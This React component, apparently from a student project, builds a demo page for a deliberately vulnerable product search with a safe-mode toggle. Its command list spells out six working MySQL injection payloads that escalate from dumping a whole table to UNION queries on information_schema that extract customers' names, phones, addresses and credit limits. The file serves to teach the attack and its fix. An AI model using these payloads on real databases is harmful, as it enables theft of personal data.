/// House Keeping ///
// Name: Warren Kavanagh 
// Email:  C16463344@MyTUDublin.ie
// Description:
//  This screen holds the components for the SQL injection attack 

// Imports //
import {useState} from 'react';
import axios from 'axios';

/// Bootstrap ///
import { Col,Button, Form, Container, Row, InputGroup,FormControl} from 'react-bootstrap';

/// Components ///
import TableDisplay from '../components/Layout/TableDisplay';
import MessageAlert from '../components/widgets/MessageAlert';
import Commands from '../components/widgets/Commands';

function SQLinjection(){
    /// API Urls for good and bad calls 
    const badAPIRoute  = `${process.env.REACT_APP_API_URL}/unsafe/sqlinjection`;
    const goodAPIRoute = `${process.env.REACT_APP_API_URL}/safe/sqlinjection`;

    /// Commands ///
    // Passed to the commands component for explanations of commands 
    const commands ={
        title:"Malicious MySQL Commands",
        commands: [
            {command:"';--<space>",explanation:"The ' ends the string pattern in the LIKE clause, the ; ends the first query and the -- comments out the %'; of the original LIKE pattern. If this code executes the new pattern to match in the LIKE clause will be '%' which is everything. This query should return all contents of the products table. "},
            {command:"Trains';--<space>", explanation:"Used Trains here to limit the output should only return few rows but still works."},
            {command:"u' UNION (SELECT 1,2,3,4,5,6,7,8,9 FROM dual);-- <space>", explanation:"\"u\" will not match with anything in the products table so will limit the output. A UNION operation allows for outputs from multiple SQL statements to be combined, here we are selecting numbers 1-9 to fill the columns of the table from the dummy \"dual\" table. If this can be done we can query other tables and get results."},
            {command:"u' UNION (SELECT TABLE_NAME,TABLE_SCHEMA,3,4,5,6,7,8,9 FROM information_schema.tables);--<space>",explanation:"This will give the table name and schema each table belongs to. This will show the other tables in the database and will then querys can be directed to them."},
            {command:"u' UNION (SELECT COLUMN_NAME,2,3,4,5,6,7,8,9 FROM information_schema.columns WHERE TABLE_NAME = 'customers');--<space>", explanation:"Need to know what columns are in the tables before they can be targeted, here the query is getting the columns of the customer table but this can be replaced by any table in the database."},
            {command:"u' UNION (SELECT customerName,phone,addressLine1,addressLine2,city,state,postalCode,country,creditLimit FROM customers);--<space>", explanation:"This command selects columns from the customers table revealing personal information such as there name, phone number and address."}

        ]
    } 


    /// State ///
    // apiURL   - Used to change between unsafe and safe mode for API call, default to unsafe
    // product  - User entered data from product search box
    // response - API response, used to display in table 
    const [apiURL, setApiURL]     = useState(badAPIRoute);    
    const [product, setProduct]   = useState('');
    const [response, setResponse] = useState();
    const [error, setError]       = useState();


    const theads = ['Product Code','Name','Line','Scale','Vendor','Description','Quantity In Stock','Price','MSRP']

    /// handleToggle ///
    // Description:
    //  Called when the "Safe Mode" button is clicked, used to toggle between the API route
    //  suciptible to injection attack and the fix 
    function handleToggle(event){
        if(apiURL === badAPIRoute){
            setApiURL(goodAPIRoute);
            console.log("CHANGE TO SAFE",apiURL);
        }else{
            setApiURL(badAPIRoute);
            console.log("CHANGE TO UNSAFE",apiURL);
        }
    }

    /// handleSearch ///
    // Description:
    //  Called when a user clicks the search button to search for a product 
    //  This sends an API request to the backend to get data and the response is then set to
    //  response state so it can be shown in the table 
    const handleSearch = async (event) => {
        try{
            setResponse()
            setError();
            let request = {
            method: 'get',
            url: apiURL,
            params: {product: product}
        }
            let res = await axios(request);
            console.log(res)
            setResponse(res.data);
        }catch(error){
            console.log(error.response.data)
            setError(error.response.data.errormessage);
        }        
    };

    return(
        <Container>
            <h1>SQL Injection</h1>
            <p>
                This page demonstrates an SQL injection attack. The search box below can be used to search for 
                products stored within the database. The query uses the string typed in the search box however it does not 
                escape characthers or check the inputted string contains SQL code. 
            </p>
            <p>
                The command which is being targeted is <text style={{fontWeight:'bold', fontStyle: 'italic'}}>SELECT * FROM products WHERE productLine LIKE '%PATTERN%';</text>.
                The <text style={{fontWeight:'bold', fontStyle: 'italic'}}>PATTERN</text> can be manipulated by entering SQL code into the search box to edit the query.
            </p>
            <Commands data={commands} />
            <Row md={3} xs={1}>
                <Col>
                <Form.Check 
                    type="switch"
                    label="Safe Mode"
                    onChange={handleToggle}
                />
                </Col>
                <Col>
                <InputGroup className="mb-3">
                    <FormControl
                        placeholder="Cars"
                        onChange={(event) => setProduct(event.target.value)}
                    ></FormControl>
                <Button
                    onClick={handleSearch}
                    variant="secondary"
                >Search</Button>    
                
                </InputGroup>
                </Col>
            </Row>
        

            {error && <MessageAlert variant='danger'>{error}</MessageAlert>}
            {typeof response !==  "undefined" &&
                <TableDisplay theads={theads}data={response}/>
            }
            
        </Container>
        
    );
}

export default SQLinjection;